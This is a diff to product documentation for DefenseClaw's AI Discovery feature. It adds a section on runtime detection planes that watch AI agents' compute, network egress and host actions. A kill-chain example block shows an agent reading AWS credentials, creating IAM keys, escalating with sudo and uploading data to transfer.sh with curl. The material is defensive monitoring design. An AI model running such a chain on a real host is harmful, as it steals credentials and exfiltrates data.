@@ -1,6 +1,6 @@
 ---
 title: AI Discovery
-description: Find AI agents, installed local models, running model servers, MCP servers, skills, and providers on the host. DefenseClaw runs a continuous fingerprinting scanner in the gateway and ships defenseclaw agent discover for an instant connector inventory.
+description: Find AI agents, installed local models, running model servers, MCP servers, skills, and providers on the host, and see which of them actually ran. DefenseClaw runs a continuous fingerprinting scanner and three runtime detection planes in the gateway, plus defenseclaw agent discover for an instant connector inventory.
 keywords:
   - DefenseClaw AI discovery
   - defenseclaw agent discover
@@ -10,6 +10,9 @@ keywords:
   - AI bill of materials
   - ai_discovery event
   - defenseclaw aibom
+  - AI discovery runtime planes
+  - shadow AI egress
+  - agent kill chain
 ---
 
 Most security teams find that the first useful question DefenseClaw answers isn't "did you block X?" — it's *"what AI is installed or running on this machine?"* AI Discovery is the four-surface inventory pipeline that answers it.
@@ -29,9 +32,10 @@ The TUI's `AI Discovery` view (above) is the operator-facing rendering of the sa
   <Card title="On-demand discovery" description="defenseclaw agent discover. Operator-side path scan that lists every connector and its install state." />
   <Card title="AIBOM" description="defenseclaw aibom scan. Connector inventory of skills, plugins, MCP servers, agents, tools, models, memory." />
   <Card title="Registry" description="defenseclaw registry. Catalog-based admission for skills and MCP servers from corporate, smithery, git, or Clawhub manifests." />
+  <Card title="Runtime planes" description="defenseclaw agent discovery runtime. Three in-gateway planes that observe what actually ran: inference compute, per-process egress, and agent actions." />
 </Cards>
 
-The four are independent — you can run any subset. Most teams start with `defenseclaw agent discover` to see what's there, then turn on continuous discovery in the gateway, then add AIBOM for compliance evidence.
+The five are independent — you can run any subset. Most teams start with `defenseclaw agent discover` to see what's there, then turn on continuous discovery in the gateway, then add AIBOM for compliance evidence, then enable the runtime planes to find out which of the inventory was ever actually used.
 
 ## Run it now: 30-second tour
 
@@ -550,10 +554,175 @@ On macOS, enhanced discovery respects the operating system's Transparency, Conse
 
 The local `GET /api/v1/ai-usage` response—and therefore `defenseclaw agent usage`—retains the dedicated `model` block so the operator can see what is installed or loaded. Local scan history retains the same block in `inventory.db`. Outbound canonical records follow each v8 destination's field-class redaction profile. Normal discovery sanitization omits extended model metadata plus model basenames/path hashes, and lifecycle correlation uses an installation-scoped HMAC pseudonym rather than a dictionary-testable model ID. Raw filesystem paths require both `ai_discovery.store_raw_local_paths: true` and a selected projection that preserves the `path` field class. The retired v7 `privacy.disable_redaction` control is not a runtime bypass.
 
+## Runtime planes: what actually ran
+
+Everything above establishes **presence and identity**. It deliberately does
+not prove that a detected component is active — an inventory that quietly
+implied liveness would be the more dangerous product.
+
+The runtime planes answer the next question. Which process, at this moment, is
+sustaining inference-level compute or sending data to which provider, and does
+a sequence of host actions add up to a chain?
+
+| Question | Answered by |
+| --- | --- |
+| What AI is **present**? | Discovery / AIBOM |
+| What AI is **allowed**? | [Registry](/docs/setup/registries) |
+| What AI **actually ran, and where did it send data**? | Runtime planes |
+
+Neither half produces the interesting pair alone. *Present but never running*
+is dormant attack surface only discovery sees. *Running and egressing but not
+present* is an agent that arrived by a path the inventory does not cover, and
+only the runtime planes see that.
+
+```bash
+defenseclaw agent discovery runtime enable --restart
+defenseclaw agent discovery runtime selftest
+defenseclaw agent discovery runtime findings
+```
+
+### The three planes
+
+| Plane | Observes | Mechanism |
+| --- | --- | --- |
+| **A** — inference heartbeat | Sustained CPU in a scriptable runtime, and resident memory large enough to hold model weights | `/proc` on Linux, `ps` on macOS, Toolhelp32 + `GetProcessTimes` on Windows |
+| **B** — shadow egress | **Per-process** socket attribution to a provider, and the DNS answers that name the peer | `/proc/net` + `/proc/<pid>/fd`, `lsof`, `GetExtendedTcpTable` |
+| **C** — agent actions | Kernel process, file, and identity events, gated on AI-agent process lineage | Endpoint Security, `cn_proc` + `fanotify`, ETW + Security log |
+
+Plane A only raises a heartbeat inside a scriptable runtime or a known model
+server. A compiled application burning CPU is a compiled application burning
+CPU, and scoring every busy process would make the signal worthless.
+
+Plane B reads **argv**, which the inventory scanner deliberately does not
+collect. That is the whole reason it exists as a separate surface: the
+inventory's process detector matches executable basenames, so an agent
+framework running inside a bare `python3` is invisible to it.
+
+<Callout type="warning" title="The runtime planes read more than the inventory does">
+argv is collected, and it is classified as **content** on the wire — each
+destination's [redaction profile](/docs/reference/redaction) governs whether it
+leaves the host. Provider hostnames are content for the same reason.
+Environment variable *values* are never read on any runtime path, matching the
+inventory scanner's names-only rule. DNS capture and the host plane each need
+their own explicit opt-in.
+</Callout>
+
+### Every host-plane signal is gated on agent lineage
+
+Not one Plane C signal fires for a process without an AI agent above it in the
+process tree. A developer running `sudo` produces nothing; the same `sudo` as a
+descendant of `claude` produces a signal.
+
+That gate is the primary false-positive control. These tactics are far too
+ordinary on a developer machine to be worth reporting without an actor
+attached:
+
+```
+claude ──▶ sh ──▶ cat ~/.aws/credentials          credential_access
+       ──▶ sh ──▶ aws iam create-access-key       identity_creation
+       ──▶ sh ──▶ sudo …                          privilege_escalation
+       ──▶ curl -T - https://transfer.sh/x        exfiltration
+```
+
+Not one of those steps is worth paging on alone, and four separate per-process
+findings would be four alerts nobody joins up. **The sequence is the finding.**
+No single host-plane tactic reaches `high` on its own; the chain bonus is
+awarded only when the session moved through three or more stages *in order*.
+An agent that reads a credential and later uploads something has progressed;
+one that uploads something and much later reads a config file has not.
+
+### Correlation with the inventory
+
+Runtime observations are joined against the discovery snapshot in process, so a
+finding reports whether the inventory can account for it:
+
+| Verdict | Meaning | Effect on the score |
+| --- | --- | --- |
+| `accounted` | Discovery independently observed the same subject | Local-inference weights are **halved** — still inventory, no longer something to chase |
+| `unaccounted` | A **complete** scan explains none of this | **Escalates**: sustained inference the filesystem walk cannot explain means the weights are not where a scanner can see them |
+| `unobserved` | There was no usable inventory to consult | **Nothing.** Neither attenuation nor escalation |
+
+That last row is the rule the design rests on: **unobserved is never spent as
+evidence or as exoneration.** A detector whose numbers fall because another
+subsystem crashed is reporting "quiet" for "blind". The blindness is still
+recorded, because not scoring on it is not the same as not saying so.
+
+Attenuation touches only local-inference signals. An inventoried model file on
+disk says nothing about where a process sent its requests, so it never
+discounts egress evidence.
+
+### Coverage is reported, never implied
+
+A detector reporting clean because it was never able to look is
+indistinguishable, on a dashboard, from a host that is genuinely clean. So
+every surface states what it could not see:
+
+```bash
+defenseclaw agent discovery runtime selftest
+```
+
+```
+  ✓ inference heartbeat: up via /proc
+  ⚠ shadow egress: available but not running -- connection table unreadable
+  ⚠ agent actions: unavailable -- eslogger not found; needs macOS 13+ and Full
+    Disk Access granted to the process that launches the gateway
+  processes: 412 read, 9 not fully readable | connections: 60 seen, 55 with no owner
+  ⚠ 92% of connections could not be attributed to a process. Run the gateway
+    with elevated privilege for machine-wide egress attribution.
+```
+
+The privilege asymmetry behind that last line is real. On macOS and Linux the
+whole process table is readable unprivileged, but the socket-to-pid mapping is
+readable only for the caller's own processes — so an unprivileged run watches
+the whole machine *compute* and only its own share of it *talk*. Windows is the
+exception: its connection table carries the owning pid in every row.
+
+Plane health is emitted on **every** cycle, including when a plane is down. If
+health were reported only while a plane worked, a subscription that died would
+leave no trace, and absence is the hardest thing to alert on.
+
+### Tunable knobs
+
+| Knob | Purpose |
+| --- | --- |
+| `--poll-interval-s` | Seconds between polls (5–3600). Also the window that distinguishes sustained inference from a momentary CPU spike. |
+| `--min-risk-to-report` | Reporting floor (1–100). Defaults to 30, the medium band. |
+| `--enable-host-plane` | Explicit opt-in for Plane C. Listing `c` in `planes` without this is ignored. |
+| `--dns-capture` | Name peers from the answer the process received rather than inferring from an address. Needs elevated privilege. |
+
+`ai_discovery.runtime.correlate` defaults on. Setting it to `false` removes the
+inventory read entirely; it does **not** make findings score as though the
+inventory disagreed.
+
+### Where the data lands
+
+Three canonical v8 log families under the existing `ai.discovery` bucket, so
+presence and behaviour share one bucket, one destination policy, and one set of
+dashboards:
+
+| Event | Carries |
+| --- | --- |
+| `ai.runtime.finding` | One scored finding, its evidence trail, and the inventory verdict |
+| `ai.runtime.activity` | One host-plane tactic, with its MITRE ATT&CK technique and chain stage |
+| `ai.runtime.plane_health` | One plane's state — emitted every cycle, including zero |
+
+A degraded cycle is reported with outcome `partial` rather than `completed`.
+The local observability stack ships `defenseclaw-ai-runtime.json`, cross-linked
+with the AI Discovery dashboard; its first row is coverage, before any finding.
+
+### TUI
+
+The `Runtime` panel (`N`) renders the same snapshot. The plane strip is always
+visible — press `p` to expand each plane's reason — and coverage sits in the
+header beside the finding count, because a reader who sees only the count
+cannot tell a quiet host from a blind sensor. `Enter` opens a finding, which
+renders a kill chain as a sequence rather than a set, and always states the
+inventory verdict including `unobserved`.
+
 ## Use it alongside Registry
 
 Discovery tells you *what's there*. The [Registry](/docs/setup/registries)
-tells you *what's allowed*.
+tells you *what's allowed*. The runtime planes tell you *what actually ran*.
 
 A common production pattern:
 
@@ -602,3 +771,4 @@ A common production pattern:
 - [Capability Matrix](/docs/capability-matrix) — what hooks each discovered connector exposes
 - [Setup → Skill Scanner](/docs/setup/skill-scanner) and [MCP Scanner](/docs/setup/mcp-scanner) — what to do *with* discovered skills and MCP servers
 - [Reference → CLI](/docs/reference/cli) — full flag surface for `agent`, `aibom`, `registry`
+- [Reference → Redaction](/docs/reference/redaction) — which field classes govern argv and provider hostnames
